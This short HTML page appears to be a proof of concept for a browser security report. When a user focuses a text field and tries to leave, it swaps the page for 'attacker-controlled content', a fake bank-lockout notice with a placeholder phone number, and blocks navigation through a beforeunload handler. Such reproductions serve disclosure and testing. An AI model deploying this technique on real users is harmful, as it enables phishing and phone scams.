<!DOCTYPE html>
<meta name="viewport" content="width=device-width, initial-scale=1" />
<p>Focus the textfield below, and then focus your urlbar and try to navigate to some other site, e.g. https://www.google.com/
<br>
<input id="nameInput">
<script>
nameInput.addEventListener("focus", (event) => {
    addEventListener("beforeunload", (e) => {
	document.body.innerHTML =
	    "<h1>This is attacker-controlled content. e.g.:</h1>" +
	    "<h3>Your bank account is locked, please call " +
	    "[attacker phone number] to unlock your account.</h3>";
	e.preventDefault();
    });
});
</script>
